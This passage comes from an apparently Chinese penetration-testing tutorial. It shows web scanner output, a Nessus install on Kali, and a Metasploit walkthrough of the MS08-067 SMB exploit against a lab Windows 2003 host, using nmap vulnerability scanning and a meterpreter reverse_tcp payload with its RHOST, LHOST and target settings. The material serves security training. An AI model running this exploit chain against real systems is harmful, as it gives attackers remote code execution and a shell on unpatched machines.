<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">]</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">):</span> <span class="nx">scraper</span> <span class="o">/</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">scraper</span> <span class="nx">Scraper</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">GET</span> <span class="nx">Free</span> <span class="nx">CSS</span> <span class="nx">template</span> <span class="nx">by</span> <span class="nx">ChocoTemplates</span><span class="p">.</span><span class="nx">com</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">]</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">):</span> <span class="nx">file</span> <span class="o">/</span><span class="p">.</span><span class="nx">svn</span><span class="o">/</span><span class="nx">entries</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">file</span> <span class="nx">SVN</span> <span class="nx">Entry</span> <span class="nx">found</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">GET</span> <span class="nx">Res</span> <span class="nx">code</span><span class="p">:</span> <span class="mi">403</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">]</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">):</span> <span class="nx">directory</span> <span class="o">/</span><span class="nx">op</span><span class="o">/</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">directory</span> <span class="nx">Directory</span> <span class="nx">found</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">GET</span> <span class="nx">Res</span> <span class="nx">code</span><span class="p">:</span> <span class="mi">200</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">]</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">):</span> <span class="nx">directory</span> <span class="o">/</span><span class="nx">ops</span><span class="o">/</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> 	<span class="nx">directory</span> <span class="nx">Directory</span> <span class="nx">found</span><span class="p">.</span>
<span class="p">...</span>
</code></pre></div></div>

<h3 id="nessus">Nessus</h3>

<p><strong>0x01安装Nessus：</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">~</span><span class="sr">/Desktop# dpkg -i Nessus-6.10.1-debian6_amd64.deb</span><span class="err"> 
</span><span class="nx">Selecting</span> <span class="nx">previously</span> <span class="nx">unselected</span> <span class="kr">package</span> <span class="nx">nessus</span><span class="p">.</span>
<span class="p">(</span><span class="nx">Reading</span> <span class="nx">database</span> <span class="p">...</span> <span class="mi">309899</span> <span class="nx">files</span> <span class="nx">and</span> <span class="nx">directories</span> <span class="nx">currently</span> <span class="nx">installed</span><span class="p">.)</span>
<span class="nx">Preparing</span> <span class="nx">to</span> <span class="nx">unpack</span> <span class="nx">Nessus</span><span class="o">-</span><span class="mf">6.10</span><span class="p">.</span><span class="mi">1</span><span class="o">-</span><span class="nx">debian6_amd64</span><span class="p">.</span><span class="nx">deb</span> <span class="p">...</span>
<span class="nx">Unpacking</span> <span class="nx">nessus</span> <span class="p">(</span><span class="mf">6.10</span><span class="p">.</span><span class="mi">1</span><span class="p">)</span> <span class="p">...</span>
<span class="nx">Setting</span> <span class="nx">up</span> <span class="nx">nessus</span> <span class="p">(</span><span class="mf">6.10</span><span class="p">.</span><span class="mi">1</span><span class="p">)</span> <span class="p">...</span>
<span class="nx">Unpacking</span> <span class="nx">Nessus</span> <span class="nx">Core</span> <span class="nx">Components</span><span class="p">...</span>
<span class="nx">nessusd</span> <span class="p">(</span><span class="nx">Nessus</span><span class="p">)</span> <span class="mf">6.10</span><span class="p">.</span><span class="mi">1</span> <span class="p">[</span><span class="nx">build</span> <span class="nx">M20082</span><span class="p">]</span> <span class="k">for</span> <span class="nx">Linux</span>
<span class="nx">Copyright</span> <span class="p">(</span><span class="nx">C</span><span class="p">)</span> <span class="mi">1998</span> <span class="o">-</span> <span class="mi">2016</span> <span class="nx">Tenable</span> <span class="nx">Network</span> <span class="nx">Security</span><span class="p">,</span> <span class="nx">Inc</span>

<span class="nx">Processing</span> <span class="nx">the</span> <span class="nx">Nessus</span> <span class="nx">plugins</span><span class="p">...</span>
<span class="p">[</span><span class="err">##################################################</span><span class="p">]</span>

<span class="nx">All</span> <span class="nx">plugins</span> <span class="nx">loaded</span> <span class="p">(</span><span class="mi">1</span><span class="nx">sec</span><span class="p">)</span>

 <span class="o">-</span> <span class="nx">You</span> <span class="nx">can</span> <span class="nx">start</span> <span class="nx">Nessus</span> <span class="nx">by</span> <span class="nx">typing</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">init</span><span class="p">.</span><span class="nx">d</span><span class="o">/</span><span class="nx">nessusd</span> <span class="nx">start</span>
 <span class="o">-</span> <span class="nx">Then</span> <span class="nx">go</span> <span class="nx">to</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//kali:8834/ to configure your scanner</span>

<span class="nx">Processing</span> <span class="nx">triggers</span> <span class="k">for</span> <span class="nx">systemd</span> <span class="p">(</span><span class="mi">228</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="p">...</span>
</code></pre></div></div>

<h2 id="attack">Attack</h2>

<h3 id="attack-windows_ms08_067">attack windows_ms08_067</h3>

<p><strong>0x01 使用nmap的扫描脚本检查漏洞</strong></p>

<p>ms08_067是一个对操作系统版本以来成都非常高地漏洞，所以为了确保目标版本触发正确地溢出代码，使用nmap收集信息。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sT</span> <span class="o">-</span><span class="nx">A</span> <span class="o">--</span><span class="nx">script</span><span class="o">=</span><span class="nx">smb</span><span class="o">-</span><span class="nx">vuln</span><span class="o">-</span><span class="nx">ms08</span><span class="o">-</span><span class="mi">067</span><span class="p">.</span><span class="nx">nse</span> <span class="o">-</span><span class="nx">P0</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">exec</span><span class="p">:</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sT</span> <span class="o">-</span><span class="nx">A</span> <span class="o">--</span><span class="nx">script</span><span class="o">=</span><span class="nx">smb</span><span class="o">-</span><span class="nx">vuln</span><span class="o">-</span><span class="nx">ms08</span><span class="o">-</span><span class="mi">067</span><span class="p">.</span><span class="nx">nse</span> <span class="o">-</span><span class="nx">P0</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>


<span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2016-02-25 03:38 EST</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="nx">service</span><span class="p">.</span><span class="nx">dvssc</span><span class="p">.</span><span class="nx">com</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">)</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.00091</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span> <span class="nx">shown</span><span class="p">:</span> <span class="mi">985</span> <span class="nx">closed</span> <span class="nx">ports</span>
<span class="nx">PORT</span>     <span class="nx">STATE</span> <span class="nx">SERVICE</span>         <span class="nx">VERSION</span>
<span class="mi">21</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">ftp</span>             <span class="nx">Microsoft</span> <span class="nx">ftpd</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">http</span>            <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="nx">httpd</span> <span class="mf">6.0</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="mf">6.0</span>
<span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">msrpc</span>           <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>     <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="mi">98</span> <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>    <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="mi">2003</span> <span class="nx">or</span> <span class="mi">2008</span> <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>
<span class="mi">777</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">multiling</span><span class="o">-</span><span class="nx">http</span><span class="p">?</span>
<span class="mi">1025</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">msrpc</span>           <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span>
<span class="mi">1026</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">msrpc</span>           <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span>
<span class="mi">1027</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">msrpc</span>           <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span>
<span class="mi">1031</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">msrpc</span>           <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span>
<span class="mi">1521</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">oracle</span><span class="o">-</span><span class="nx">tns</span>      <span class="nx">Oracle</span> <span class="nx">TNS</span> <span class="nx">Listener</span> <span class="mf">10.2</span><span class="p">.</span><span class="mf">0.1</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="k">for</span> <span class="mi">32</span><span class="o">-</span><span class="nx">bit</span> <span class="nx">Windows</span><span class="p">)</span>
<span class="mi">6002</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>            <span class="nx">SafeNet</span> <span class="nx">Sentinel</span> <span class="nx">Protection</span> <span class="nx">Server</span> <span class="nx">httpd</span> <span class="mf">7.3</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">SentinelProtectionServer</span><span class="o">/</span><span class="mf">7.3</span>
<span class="mi">7001</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">afs3</span><span class="o">-</span><span class="nx">callback</span><span class="p">?</span>
<span class="mi">7002</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>            <span class="nx">SafeNet</span> <span class="nx">Sentinel</span> <span class="nx">Keys</span> <span class="nx">License</span> <span class="nx">Monitor</span> <span class="nx">httpd</span> <span class="mf">1.0</span> <span class="p">(</span><span class="nx">Java</span> <span class="nx">Console</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">SentinelKeysServer</span><span class="o">/</span><span class="mf">1.0</span>
<span class="mi">8099</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>            <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="nx">httpd</span> <span class="mf">6.0</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="mf">6.0</span>
<span class="mi">1</span> <span class="nx">service</span> <span class="nx">unrecognized</span> <span class="nx">despite</span> <span class="nx">returning</span> <span class="nx">data</span><span class="p">.</span> <span class="nx">If</span> <span class="nx">you</span> <span class="nx">know</span> <span class="nx">the</span> <span class="nx">service</span><span class="o">/</span><span class="nx">version</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">submit</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">fingerprint</span> <span class="nx">at</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="nx">SF</span><span class="o">-</span><span class="nx">Port777</span><span class="o">-</span><span class="nx">TCP</span><span class="p">:</span><span class="nx">V</span><span class="o">=</span><span class="mf">7.01</span><span class="o">%</span><span class="nx">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="nx">D</span><span class="o">=</span><span class="mi">2</span><span class="o">/</span><span class="mi">25</span><span class="o">%</span><span class="nx">Time</span><span class="o">=</span><span class="mi">58</span><span class="nx">B142B7</span><span class="o">%</span><span class="nx">P</span><span class="o">=</span><span class="nx">x86_64</span><span class="o">-</span><span class="nx">pc</span><span class="o">-</span><span class="nx">linux</span><span class="o">-</span><span class="nx">gnu</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">Ker</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">beros</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="s2">"</span><span class="err">\</span><span class="s2">x01</span><span class="err">\</span><span class="s2">0</span><span class="err">\</span><span class="s2">t</span><span class="err">\</span><span class="s2">xe0</span><span class="err">\</span><span class="s2">x06"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">SMBProgNeg</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="s2">"</span><span class="err">\</span><span class="s2">x01</span><span class="err">\</span><span class="s2">0</span><span class="err">\</span><span class="s2">t</span><span class="err">\</span><span class="s2">xe0</span><span class="err">\</span><span class="s2">x06"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">Termin</span>
<span class="nx">SF</span><span class="p">:</span><span class="nx">alServer</span><span class="p">,</span><span class="nx">A</span><span class="p">,</span><span class="s2">"</span><span class="err">\</span><span class="s2">x01</span><span class="err">\</span><span class="s2">0</span><span class="err">\</span><span class="s2">t</span><span class="err">\</span><span class="s2">xe0</span><span class="err">\</span><span class="s2">x06</span><span class="err">\</span><span class="s2">x01</span><span class="err">\</span><span class="s2">0</span><span class="err">\</span><span class="s2">t</span><span class="err">\</span><span class="s2">xe0</span><span class="err">\</span><span class="s2">x06"</span><span class="p">)</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">WMSRequest</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="s2">"</span><span class="err">\</span><span class="s2">x01</span><span class="err">\</span><span class="s2">0</span><span class="err">\</span><span class="s2">t
SF:</span><span class="err">\</span><span class="s2">xe0</span><span class="err">\</span><span class="s2">x06"</span><span class="p">);</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">0</span><span class="nx">C</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">9</span><span class="nx">D</span><span class="p">:</span><span class="mi">6</span><span class="nx">E</span><span class="p">:</span><span class="mi">8</span><span class="nx">D</span> <span class="p">(</span><span class="nx">VMware</span><span class="p">)</span>
<span class="nx">Device</span> <span class="nx">type</span><span class="p">:</span> <span class="nx">general</span> <span class="nx">purpose</span>
<span class="nx">Running</span><span class="p">:</span> <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">XP</span><span class="o">|</span><span class="mi">2003</span>
<span class="nx">OS</span> <span class="nx">CPE</span><span class="p">:</span> <span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows_xp</span><span class="p">::</span><span class="nx">sp2</span><span class="p">:</span><span class="nx">professional</span> <span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows_server_2003</span>
<span class="nx">OS</span> <span class="nx">details</span><span class="p">:</span> <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">XP</span> <span class="nx">Professional</span> <span class="nx">SP2</span> <span class="nx">or</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2003</span>
<span class="nx">Network</span> <span class="nx">Distance</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">hop</span>
<span class="nx">Service</span> <span class="nx">Info</span><span class="p">:</span> <span class="nx">OSs</span><span class="p">:</span> <span class="nx">Windows</span><span class="p">,</span> <span class="nx">Windows</span> <span class="mi">98</span><span class="p">;</span> <span class="nl">CPE</span><span class="p">:</span> <span class="nl">cpe</span><span class="p">:</span><span class="sr">/o:microsoft:windows, cpe:/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows_98</span><span class="p">,</span> <span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows_server_2003</span>

<span class="nx">Host</span> <span class="nx">script</span> <span class="nx">results</span><span class="p">:</span>
<span class="o">|</span> <span class="nx">smb</span><span class="o">-</span><span class="nx">vuln</span><span class="o">-</span><span class="nx">ms08</span><span class="o">-</span><span class="mi">067</span><span class="p">:</span> 
<span class="o">|</span>   <span class="nx">VULNERABLE</span><span class="p">:</span>
<span class="o">|</span>   <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">system</span> <span class="nx">vulnerable</span> <span class="nx">to</span> <span class="nx">remote</span> <span class="nx">code</span> <span class="nx">execution</span> <span class="p">(</span><span class="nx">MS08</span><span class="o">-</span><span class="mi">067</span><span class="p">)</span>
<span class="o">|</span>     <span class="nx">State</span><span class="p">:</span> <span class="nx">VULNERABLE</span>
<span class="o">|</span>     <span class="nx">IDs</span><span class="p">:</span>  <span class="nx">CVE</span><span class="p">:</span><span class="nx">CVE</span><span class="o">-</span><span class="mi">2008</span><span class="o">-</span><span class="mi">4250</span>
<span class="o">|</span>           <span class="nx">The</span> <span class="nx">Server</span> <span class="nx">service</span> <span class="k">in</span> <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="mi">2000</span> <span class="nx">SP4</span><span class="p">,</span> <span class="nx">XP</span> <span class="nx">SP2</span> <span class="nx">and</span> <span class="nx">SP3</span><span class="p">,</span> <span class="nx">Server</span> <span class="mi">2003</span> <span class="nx">SP1</span> <span class="nx">and</span> <span class="nx">SP2</span><span class="p">,</span> 
<span class="o">|</span>           <span class="nx">Vista</span> <span class="nx">Gold</span> <span class="nx">and</span> <span class="nx">SP1</span><span class="p">,</span> <span class="nx">Server</span> <span class="mi">2008</span><span class="p">,</span> <span class="nx">and</span> <span class="mi">7</span> <span class="nx">Pre</span><span class="o">-</span><span class="nx">Beta</span> <span class="nx">allows</span> <span class="nx">remote</span> <span class="nx">attackers</span> <span class="nx">to</span> <span class="nx">execute</span> <span class="nx">arbitrary</span> 
<span class="o">|</span>           <span class="nx">code</span> <span class="nx">via</span> <span class="nx">a</span> <span class="nx">crafted</span> <span class="nx">RPC</span> <span class="nx">request</span> <span class="nx">that</span> <span class="nx">triggers</span> <span class="nx">the</span> <span class="nx">overflow</span> <span class="nx">during</span> <span class="nx">path</span> <span class="nx">canonicalization</span><span class="p">.</span>
<span class="o">|</span>           
<span class="o">|</span>     <span class="nx">Disclosure</span> <span class="nx">date</span><span class="p">:</span> <span class="mi">2008</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">23</span>
<span class="o">|</span>     <span class="nx">References</span><span class="p">:</span>
<span class="o">|</span>       <span class="nx">https</span><span class="p">:</span><span class="c1">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span>
<span class="o">|</span><span class="nx">_</span>      <span class="nx">https</span><span class="p">:</span><span class="c1">//technet.microsoft.com/en-us/library/security/ms08-067.aspx</span>

<span class="nx">TRACEROUTE</span>
<span class="nx">HOP</span> <span class="nx">RTT</span>     <span class="nx">ADDRESS</span>
<span class="mi">1</span>   <span class="mf">0.91</span> <span class="nx">ms</span> <span class="nx">service</span><span class="p">.</span><span class="nx">dvssc</span><span class="p">.</span><span class="nx">com</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">)</span>

<span class="nx">OS</span> <span class="nx">and</span> <span class="nx">Service</span> <span class="nx">detection</span> <span class="nx">performed</span><span class="p">.</span> <span class="nx">Please</span> <span class="nx">report</span> <span class="nx">any</span> <span class="nx">incorrect</span> <span class="nx">results</span> <span class="nx">at</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="nx">Nmap</span> <span class="nx">done</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">host</span> <span class="nx">up</span><span class="p">)</span> <span class="nx">scanned</span> <span class="k">in</span> <span class="mf">140.40</span> <span class="nx">seconds</span>
</code></pre></div></div>

<blockquote>
  <p>在msf中调用nmap的插件<code class="highlighter-rouge">--script=smb-vuln-ms08-067.nse</code>进行漏扫，<code class="highlighter-rouge">-sT</code>是指隐秘的TCP连接扫描（实践中，使用该参数进行端口枚举是最可靠。其他推荐的参数还有<code class="highlighter-rouge">-sS</code>，隐秘的TCP Syn扫描），<code class="highlighter-rouge">-A</code>是指高级操作系统探测功能，它会对一个特定服务进行更深入的flag和指纹获取，提供更多的信息。</p>

  <p>攻击成功与否决定于目标系统的OS版本、安装的服务包(Service Pack)版本以及语言类型，同时还依赖于是否成功地绕过了数据执行保护(DEP:Data Execution Prevention，DEP是为了防止缓冲区溢出攻击而设计地，它将程序堆栈渲染为只读，以防止shellcode被恶意放置在堆栈区并执行。绕过DEP保护可查阅http://www.uninformed.org/?v=2&amp;a=4)</p>
</blockquote>

<p><strong>0x02设置攻击参数</strong>
根据nmap收集的参数，选择了ms08_067的exploits，然后设置必要的参数。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">search</span> <span class="nx">ms08_067_netapi</span>

<span class="nx">Matching</span> <span class="nx">Modules</span>
<span class="o">================</span>

   <span class="nx">Name</span>                                 <span class="nx">Disclosure</span> <span class="nb">Date</span>  <span class="nx">Rank</span>   <span class="nx">Description</span>
   <span class="o">----</span>                                 <span class="o">---------------</span>  <span class="o">----</span>   <span class="o">-----------</span>
   <span class="nx">exploit</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">smb</span><span class="o">/</span><span class="nx">ms08_067_netapi</span>  <span class="mi">2008</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">28</span>       <span class="nx">great</span>  <span class="nx">MS08</span><span class="o">-</span><span class="mi">067</span> <span class="nx">Microsoft</span> <span class="nx">Server</span> <span class="nx">Service</span> <span class="nx">Relative</span> <span class="nx">Path</span> <span class="nx">Stack</span> <span class="nx">Corruption</span>

<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOST</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="nx">RHOST</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span>
<span class="nx">RHOST</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">targets</span>

<span class="nx">Exploit</span> <span class="nx">targets</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">0</span>   <span class="nx">Automatic</span> <span class="nx">Targeting</span>
   <span class="mi">1</span>   <span class="nx">Windows</span> <span class="mi">2000</span> <span class="nx">Universal</span>
   <span class="mi">2</span>   <span class="nx">Windows</span> <span class="nx">XP</span> <span class="nx">SP0</span><span class="o">/</span><span class="nx">SP1</span> <span class="nx">Universal</span>
   <span class="mi">3</span>   <span class="nx">Windows</span> <span class="mi">2003</span> <span class="nx">SP0</span> <span class="nx">Universal</span>
   <span class="mi">4</span>   <span class="nx">Windows</span> <span class="nx">XP</span> <span class="nx">SP2</span> <span class="nx">English</span> <span class="p">(</span><span class="nx">AlwaysOn</span> <span class="nx">NX</span><span class="p">)</span>
   <span class="mi">5</span>   <span class="nx">Windows</span> <span class="nx">XP</span> <span class="nx">SP2</span> <span class="nx">English</span> <span class="p">(</span><span class="nx">NX</span><span class="p">)</span>
  <span class="p">...</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">target</span> <span class="mi">3</span>
<span class="nx">target</span> <span class="o">=&gt;</span> <span class="mi">3</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">smb</span><span class="o">/</span><span class="nx">ms08_067_netapi</span><span class="p">):</span>

   <span class="nx">Name</span>     <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">RHOST</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>     <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span>
   <span class="nx">RPORT</span>    <span class="mi">445</span>              <span class="nx">yes</span>       <span class="nb">Set</span> <span class="nx">the</span> <span class="nx">SMB</span> <span class="nx">service</span> <span class="nx">port</span>
   <span class="nx">SMBPIPE</span>  <span class="nx">BROWSER</span>          <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">pipe</span> <span class="nx">name</span> <span class="nx">to</span> <span class="nx">use</span> <span class="p">(</span><span class="nx">BROWSER</span><span class="p">,</span> <span class="nx">SRVSVC</span><span class="p">)</span>


<span class="nx">Payload</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>

   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">EXITFUNC</span>  <span class="nx">thread</span>           <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nx">technique</span> <span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="s1">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
   <span class="nx">LHOST</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.134</span>     <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">address</span>
